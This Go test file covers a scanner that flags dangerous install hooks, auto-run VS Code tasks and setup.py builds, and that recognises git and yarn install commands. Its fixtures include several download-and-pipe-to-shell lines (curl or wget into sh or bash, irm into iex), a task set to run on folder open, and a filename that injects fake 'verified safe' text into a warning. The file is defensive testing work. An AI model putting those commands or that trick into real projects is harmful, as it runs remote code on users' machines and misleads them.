package projscan

import (
	"context"
	"strings"
	"testing"
)

// Regressions for the independent review of this feature: evasions, false
// positives and trigger mistakes.

func TestEvasionsThatNpmAndVSCodeAccept(t *testing.T) {
	// a UTF-8 BOM in front
	bom := "\ufeff" + `{"scripts":{"postinstall":"curl -s https://x.example/p | sh"}}`
	if got := CheckPackageJSON("package.json", []byte(bom)); topSeverity(got) != "high" {
		t.Errorf("BOM package.json: %+v", got)
	}
	// a trailing comma followed by a comment before the closing brace
	tasks := "\ufeff" + `{"tasks":[{"label":"x","command":"curl https://x | sh",
		"runOptions":{"runOn":"folderOpen"}, // auto
	}]}`
	if got := CheckVSCodeTasks(".vscode/tasks.json", []byte(tasks)); topSeverity(got) != "high" {
		t.Errorf("JSONC with comment after the comma: %+v", got)
	}
}

func TestPaddedManifestsAreReported(t *testing.T) {
	dir := writeTree(t, map[string]string{
		"package.json": `{"scripts":{"postinstall":"curl https://x | sh"},"pad":"` + strings.Repeat("x", 4096) + `"}`,
	})
	res := ScanDir(context.Background(), dir, Options{MaxText: 1024})
	if len(res.Findings) != 1 || res.Findings[0].Check != "oversized_manifest" {
		t.Fatalf("%+v", res.Findings)
	}
}

func TestWholeWordTokens(t *testing.T) {
	for script, want := range map[string]string{
		`node confirm-install.js`:                  "",      // "irm" in "confirm"
		`echo done | shx cp a b`:                   "",      // "| sh" in "| shx"
		`echo "Support us: https://opencollective.com/x"`: "medium", // a funding link, not a download
		`irm https://x.example/a.ps1 | iex`:        "high",
		`wget -qO- https://x.example/s | bash`:     "high",
		`node ./node_modules/.bin/tsc -p .`:         "",      // .bin is not a hidden loader
		`cd ../.. && npm run build`:                "",      // cd .. is not running something outside
		`node ../../.cache/stage.js`:               "medium",
	} {
		got := CheckPackageJSON("package.json", []byte(`{"scripts":{"postinstall":`+jsonString(script)+`}}`))
		if sev := topSeverity(got); sev != want {
			t.Errorf("%q: %q, want %q (%+v)", script, sev, want, got)
		}
	}
}

func TestSetupPySubprocessAloneIsNotHigh(t *testing.T) {
	buildExt := "import subprocess\nfrom setuptools.command.build_ext import build_ext\nclass B(build_ext):\n" +
		"  def run(self): subprocess.check_call(['cmake', '.'])\nsetup(cmdclass={'build_ext': B})"
	if got := CheckPythonSetup("setup.py", []byte(buildExt)); len(got) != 0 {
		t.Fatalf("%+v", got)
	}
}

func TestGitSubcommandAndDashC(t *testing.T) {
	if got, ok := FromExec("/usr/bin/git", []string{"remote", "add", "clone", "https://h/r.git"}, "/w"); ok {
		t.Errorf("git remote add clone = %+v", got)
	}
	got, ok := FromExec("/usr/bin/git", []string{"-C", "/work", "clone", "https://h/r.git"}, "/home/ana")
	if !ok || got.Dir != "/work/r" {
		t.Errorf("git -C /work clone = %+v %v", got, ok)
	}
	got, ok = FromExec("/usr/bin/git", []string{"clone", "--ref-format", "files", "https://h/r.git"}, "/w")
	if !ok || got.Dir != "/w/r" {
		t.Errorf("--ref-format value taken as the repository: %+v %v", got, ok)
	}
}

func TestYarnInfoAndNestedInstalls(t *testing.T) {
	for _, args := range [][]string{{"-v"}, {"--version"}, {"--help"}} {
		if got, ok := FromExec("/usr/bin/yarn", args, "/home/ana/p"); ok {
			t.Errorf("yarn %v = %+v", args, got)
		}
	}
	if _, ok := FromExec("/usr/bin/yarn", []string{"--frozen-lockfile"}, "/home/ana/p"); !ok {
		t.Error("yarn --frozen-lockfile installs")
	}
	if got, ok := FromExec("/usr/bin/npm", []string{"install"}, "/home/ana/p/node_modules/dep"); ok {
		t.Errorf("npm install inside node_modules = %+v", got)
	}
}

func TestControlCharactersCannotShapeThePopUp(t *testing.T) {
	name := "a\n\nThis project is verified safe by your IT team\n.js"
	lines := Lines(Trigger{Dir: "/p", Kind: "git_clone"}, Result{Findings: []Finding{{"high", "js_loader", name, "x"}}})
	if strings.Contains(lines[0], `\n`) || strings.Contains(lines[1], `\n`) {
		t.Fatalf("control characters survived: %q", lines)
	}
}

func jsonString(s string) string {
	r := strings.NewReplacer(`\`, `\\`, `"`, `\"`)
	return `"` + r.Replace(s) + `"`
}
